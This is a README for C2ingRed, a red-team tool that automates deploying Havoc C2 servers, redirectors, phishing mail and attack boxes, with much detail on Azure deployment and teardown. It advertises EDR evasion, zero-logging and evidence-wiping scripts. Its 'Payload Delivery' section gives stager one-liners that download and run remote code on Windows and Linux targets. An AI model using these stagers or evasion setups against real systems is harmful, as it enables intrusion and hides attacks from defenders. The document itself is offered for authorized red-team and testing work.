# C2ingRed

A comprehensive automated deployment system for Havoc C2 red team infrastructure.

## Overview

C2ingRed enables rapid deployment of complete Command and Control (C2) infrastructure with advanced security hardening, EDR evasion capabilities, and operational security features. Built for professional red team operators, this tool uses Infrastructure as Code principles to efficiently set up Havoc C2 servers, redirectors, and additional components.

## Features

- **Multi-provider Support**: AWS, Linode, FlokiNET, and registered Azure workloads
- **Infrastructure Components**:
  - C2 server with Havoc C2 Framework (dev branch)
  - HTTPS redirectors with security hardening
  - Email infrastructure with DKIM/DMARC for phishing
  - Email tracking capabilities
  - Automated payload generation and delivery
  - Attack boxes (Kali Linux and custom Ubuntu)
  - **Quick Recon Box** - Streamlined reconnaissance platform (5-8 min deployment)
- **Security Features**:
  - Zero-logging configuration to minimize evidence
  - Memory protection mechanisms
  - Command history suppression
  - Secure exfiltration tunnels
  - Strong firewall configurations
  - Fail2Ban and other defensive measures
- **EDR Evasion**:
  - Sleep masking
  - Stack spoofing
  - AMSI/ETW patching
  - Indirect syscalls
  - Binary signature randomization
- **Operational Capabilities**:
  - Automated post-exploitation payload building
  - Reverse shell handler with automatic agent deployment
  - Let's Encrypt SSL certificate automation
  - Payload synchronization between C2 and redirectors
  - Port randomization for OPSEC

## Requirements

- Python 3.6+
- Ansible 2.9+
- Provider-specific credentials:
  - AWS: Access and secret keys
  - Linode: API token
  - FlokiNET: Pre-provisioned servers
- SSH keypair for server access
- Registered domain (required for Let's Encrypt certificates)

## Installation

```bash
# Clone the repository
git clone https://github.com/yourusername/C2ingRed.git
cd C2ingRed

# Install requirements
pip install -r requirements.txt

# Ensure Ansible is installed
ansible --version
```

## Usage

### Azure infrastructure and quick-recon VM

The Azure flow and its smoke-test script require Python 3.12 or newer.

Choose **Tools & Utilities → Infrastructure-only VM**, then **Azure**, or run
`python3 modules/infrastructure/deploy_infrastructure.py`. The Attack Box menu
also offers Azure for its Quick Recon Box subtype. These routes create a
dedicated resource group, network, firewall, static
Standard IPv4, NIC and Ubuntu 24.04 VM with a 32-GiB StandardSSD managed disk.
SSH is allowed only from your public IPv4 /32, password login is disabled, and
normal system logs and managed boot diagnostics remain enabled.

The Azure quick-recon route reuses the provider-neutral task module to install
the workspace, nmap/DNS tools, Tor, torsocks and proxychains. Its provider owns
the durable state and deployment key, and standalone teardown uses the saved
workload identity before removing its active deployment record. Preview its
non-mutating harness with `python3 scripts/test_azure_attack_box_live.py`; run a
real deploy/repeat/SSH verification/cleanup cycle by adding `--activate`.
Kali and full attack-box subtypes are refused because the subscription has not
accepted the Kali Marketplace image terms; they are not silently mapped to
Ubuntu. Azure C2, redirector, phishing, payload-server and WEBRUNNER handlers
are not registered yet and therefore are not advertised as Azure capabilities.

Use an authenticated Azure CLI session (`az login`) and supply the subscription,
region, VM size and SSH public key explicitly. No Azure SDK package is required;
the localhost Ansible playbooks use the installed Azure CLI. Register
`Microsoft.Compute` and `Microsoft.Network` and check regional quota, policy,
image and SKU availability before deploying. See
`providers/Azure/vars.example.yaml` for non-secret configuration. The controller
does not pass other providers' credentials into Azure tasks.

Deployment intent is saved atomically with owner-only permissions under
`deployments/azure/<deployment_id>.json` before cloud creation. Repeat a deployment
with the same configuration to update its resources. Recovery uses
`python3 modules/infrastructure/deploy_infrastructure.py --teardown-id <deployment_id>`;
the same module's `--teardown-all` and main Cleanup menu also discover
these files independently of legacy logs. Cleanup refuses foreign groups and
unexpected resources, cancels active ARM provisioning, and confirms group deletion
before removing only keys generated for that deployment. Keep failed state files
for recovery; successful state is retained in `deployments/azure/archive/`.
Standalone recovery by ID is also supported through
`python3 teardown.py --deployment-id <deployment_id>` (add `--force` to skip its
confirmation). It prefers adapter state and uses legacy lookup only when no
adapter state exists. Standalone `--list`, `--select`, and `--all` also discover
adapter deployments alongside legacy logs. Matching adapter records take priority;
unreadable records or conflicting deployment IDs abort discovery before deletion.
Failed adapter cleanup never retries through legacy cleanup. Batch cleanup reports
failure through a nonzero exit status if any deployment fails.

Preview the reviewed live smoke with `python3 deploy.py --deploy --azure-smoke --dry-run`.
Run `python3 scripts/deploy_azure_smoke.py --prepare` for the reviewed commit, push,
artifact, registration and preflight steps without creating a resource group or VM.
Preparation cleans its generated key and records a preparation result; it does not
report a passed live test. Run the actual test with
`python3 deploy.py --deploy --azure-smoke --activate`, which repeats all preconditions.
Activation commits approved paths through hooks, pushes and verifies
`forgejo/public`, archives the committed source, checks a new empty target, and
tests one temporary VM in East US before cleanup. Live defaults are subscription
`cc2a66d1-67c2-47ca-856f-19a4eae52cfe` and `Standard_D2as_v4`; the script stops on
quota, image, SKU or policy failure. SSH uses a dedicated known_hosts file and
explicit `accept-new` trust on first use; changed keys are rejected. Provisioning
and validation have a 30-minute deadline, with a separate 10-minute cleanup budget.
SIGINT/SIGTERM stop controller children and trigger cleanup; SIGKILL or workstation
loss can leave resources that require the persisted-state recovery command.

The smoke test captures the subscription resource and resource-group inventory
before provisioning and requires that inventory to be restored before reporting
success. In an initially empty test subscription, it also removes the default
East US Network Watcher and its empty group if they are the only additions and
have no running operations, connection monitors, captures or flow logs. Existing
monitoring resources are preserved. Unexpected changes or shared-subscription
additions stop automatic cleanup and are reported for review. This assumes an
exclusive test subscription during automatic monitoring cleanup; Azure does not
provide an atomic inventory-and-delete operation across independent controllers.

Tools & Utilities now performs a real read-only Azure connectivity check using
the CLI's selected subscription. Configuration validation checks Azure inputs and
the public key when `providers/Azure/vars.yaml` exists; interactive configuration
does not require that file. Local key cleanup preserves keys referenced by active
infrastructure state and refuses deletion if that state cannot be read.
Infrastructure Health Check now reads the owned VM's provisioning and power
state through its adapter. The same read-only check is available as
`python3 modules/infrastructure/deploy_infrastructure.py --health`; an unhealthy
or unavailable check returns failure. An empty result means no tracked adapter
deployments, not that every cloud resource or legacy workload was checked.

### Provider routing and incremental migration

All four providers enter the dispatcher in `utils/provider_registry.py`.
The registry is the source of provider names, directories, SSH defaults,
configuration loaders and new workload routes. Configuration loaders for AWS,
Linode and FlokiNET delegate to the existing functions.

For deployment, playbook selection and cleanup, the dispatcher looks for a
registered **provider + workload** handler first. If no handler exists, providers
with legacy support retain their existing route. A handler's failure or invalid
registration never falls back to legacy execution. Existing selectors and menu
defaults are preserved; registering one workload does not replace the provider's
other workloads or advertise unsupported capabilities.

Attack-box, C2, redirector, phishing and payload-server menus now request their
canonical workload through this dispatcher. They offer registered handlers plus
providers that explicitly retain legacy support, gather configuration from a new
handler when present, and otherwise call the existing provider loader. Subtype
names such as `gophish_only` remain deployment details and no longer obscure the
canonical provider workload. Phishing and payload-server execution also enters
the dispatcher before their unchanged legacy executors.

The neutral infrastructure module uses the adapter contract rather than Azure
imports. An adapter supplies configuration, validation, key preparation, playbook
selection, deployment, cleanup and durable-state discovery. New handlers are
registered in `ProviderSpec.routes`; adding a provider or workload does not
require adding another provider switch to that module. Azure implements the
infrastructure and quick-recon attack-box handlers today. AWS, Linode and FlokiNET retain their existing
workload implementations through the compatibility fallback; they have not been
silently rewritten or live-tested by this change. WEBRUNNER now uses a composite
dispatcher: an all-legacy provider selection runs its existing playbook once, and
a compatible all-new selection uses its registered handler. Mixed new/legacy or
incompatible handler selections stop before provisioning because splitting one
scan lifecycle would make results and cleanup ambiguous.

The read-only coverage audit derives its result from the same registry used for
dispatch. It distinguishes native handlers, explicit transition handlers, legacy
fallbacks and unsupported combinations. Requiring Azure currently exits nonzero
and lists the service routes that remain unimplemented:

```bash
python3 scripts/audit_provider_coverage.py --require-provider azure
```

Phantom uses the same provider/workload dispatcher when c2itall launches it.
Its legacy AWS, Linode and FlokiNET routes remain unchanged, while the registered
Azure route provisions the VM through the recoverable Azure infrastructure
adapter and then runs Phantom's existing hardening and service playbooks. Azure
network rules are derived from the selected privacy service; SSH remains limited
to the operator /32. The real-cloud validation command below deploys WireGuard,
repeats the complete deployment against the same owned resources, verifies the
running service and client configuration over SSH, verifies Azure VM and NSG
state, tears down through Phantom, and requires the subscription inventory to
return to its baseline:

```bash
python3 scripts/test_azure_phantom_live.py --activate
```

The live test uses the authenticated Azure CLI subscription
`cc2a66d1-67c2-47ca-856f-19a4eae52cfe`, East US and `Standard_D2as_v4`. Its
default mode is a non-mutating description; `--activate` is required to create
the temporary VM. Evidence is retained under `logs/azure-phantom-live/`; the
temporary resource group, generated SSH key and Phantom working files are removed.
Provider registrations remain enabled after the test.

The formerly missing **Deploy Chat Server** entry now keeps its distinct purpose:
it reuses Phantom's Matrix + Element core, then adds Tailscale private networking
and optional `matrix-nio` bot runtime/systemd scaffolding. It enters through the
canonical `chat` provider route. Azure uses the registered recoverable adapter;
AWS, Linode and FlokiNET retain Phantom's existing provider lifecycle as the
legacy fallback. A blank Tailscale key installs and starts `tailscaled` for later
manual authentication; a supplied key is handled with Ansible output suppression.
Deployment summaries redact passwords, auth keys and generated Matrix secrets;
owner-only deployment information remains available for recovery.

### Main Menu (Easiest Method)

Simply run:
```bash
python3 deploy.py
```

This launches the interactive main menu for deployment, providing the most user-friendly experience with guided options for all infrastructure types.

### Interactive Mode

Alternatively, you can use:
```bash
./deploy.py --interactive
```

This guides you through the deployment process with step-by-step instructions.

### Command-line Deployment

#### AWS Deployment:
```bash
./deploy.py --provider aws --aws-key YOUR_KEY --aws-secret YOUR_SECRET \
            --domain your-domain.com --aws-region us-east-1
```

#### Linode Deployment:
```bash
./deploy.py --provider linode --linode-token YOUR_TOKEN \
            --domain your-domain.com --linode-region us-east
```

#### FlokiNET Deployment (with pre-provisioned servers):
```bash
./deploy.py --provider flokinet --flokinet-redirector-ip YOUR_REDIRECTOR_IP \
            --flokinet-c2-ip YOUR_C2_IP --domain your-domain.com
```

### Deployment Options

| Option | Description |
|--------|-------------|
| `--redirector-only` | Deploy only the redirector component |
| `--c2-only` | Deploy only the C2 server component |
| `--deploy-tracker` | Deploy email tracking server |
| `--integrated-tracker` | Setup tracker on C2 server instead of separate instance |
| `--disable-history` | Disable command history on servers |
| `--secure-memory` | Enable secure memory protection features |
| `--zero-logs` | Configure zero-logging throughout infrastructure |
| `--randomize-ports` | Use randomized ports for C2 communications |
| `--ssh-after-deploy` | Automatically SSH into the server after deployment |

## Post-Deployment Steps

After successful deployment:

1. Configure DNS records for your domain:
   - `your-domain.com` → C2 server
   - `mail.your-domain.com` → C2 server
   - `cdn.your-domain.com` → Redirector (or your custom subdomain)
   - `track.your-domain.com` → Tracker (if deployed)

2. Run post-install scripts on each server:
   ```bash
   # On C2 server
   /root/Tools/post_install_c2.sh
   
   # On redirector
   /root/Tools/post_install_redirector.sh
   ```

3. Generate Havoc C2 payloads:
   ```bash
   # On C2 server
   /root/Tools/generate_havoc_payloads.sh
   ```

## Using Havoc C2

Havoc C2 Framework is installed at `/root/Tools/Havoc` on the C2 server.

### Connecting to the Teamserver

From your local machine:

```bash
# Install Havoc client (development branch)
git clone -b dev https://github.com/HavocFramework/Havoc.git
cd Havoc/Client
mkdir build && cd build
cmake -GNinja ..
ninja

# Connect to Teamserver
./havoc client --address YOUR_C2_IP:40056 --username admin --password [password]
```

The password is stored in `/root/Tools/Havoc/data/profiles/default.yaotl` on the C2 server.

### Payload Delivery

PowerShell one-liner for Windows targets:
```powershell
powershell -exec bypass -c "iex(New-Object Net.WebClient).DownloadString('https://cdn.your-domain.com/windows_stager.ps1')"
```

Linux one-liner:
```bash
curl -s https://cdn.your-domain.com/linux_stager.sh | bash
```

## Security Considerations

- All servers include the `/root/Tools/secure-exit.sh` script to securely wipe operational data
- The `/root/Tools/clean-logs.sh` script automatically runs to remove evidence
- Port randomization enhances OPSEC when enabled
- Set proper DKIM/DMARC records for email operations
- Consider using ephemeral infrastructure for high-risk operations

## Cleaning Up

To remove all infrastructure when finished:

```bash
./deploy.py --provider PROVIDER --teardown --deployment-id YOUR_DEPLOYMENT_ID
```

Add your provider-specific authentication arguments to remove the correct resources.

## Disclaimer

This tool is intended for authorized red team operations, penetration testing, and security research only. Always obtain proper authorization before conducting security testing. The authors are not responsible for misuse or illegal activities.
